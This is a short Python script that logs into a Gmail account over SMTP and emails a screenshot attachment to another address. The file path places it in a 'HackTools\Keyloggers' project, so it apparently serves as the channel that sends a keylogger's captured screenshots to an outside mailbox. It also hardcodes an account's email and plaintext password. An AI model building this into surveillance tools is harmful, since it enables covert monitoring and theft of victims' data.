import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import sys

try:
    mail = smtplib.SMTP("smtp.gmail.com", 587)
    mail.ehlo()
    mail.starttls()

    mail.login("thewolverine0743@gmail.com", "123456tw")

    #  Setup MIME
    mesaj = MIMEMultipart()
    mesaj["From"] = "thewolverine0743@gmail.com"
    mesaj["To"] = "ibatuhanbrl@gmail.com"
    mesaj["Subject"] = "Deneme Maili 1"

    #  Body and attachments
    body = """
    Sana Python ile bir mail gönderiyorum.
    """
    body_text = MIMEText(body, "plain")
    mesaj.attach(body_text)

    with open(r"C:\Users\ibatu\PycharmProjects\HackTools\Keyloggers\Resources\Screenshots\image'1'.png", "rb") as file:
        mime = MIMEBase("image", "png", filename="image1.png")
        mime.add_header("Content-Disposition", "attachment", filename="img1.png")
        mime.add_header("Content-ID", "<0>")
        mime.set_payload(file.read())
        encoders.encode_base64(mime)
        mesaj.attach(mime)

    mail.sendmail(mesaj["From"], mesaj["To"], mesaj.as_string())
    mail.quit()
    print("Mail sent.")
except:
    print("Hata:", sys.exc_info()[0])
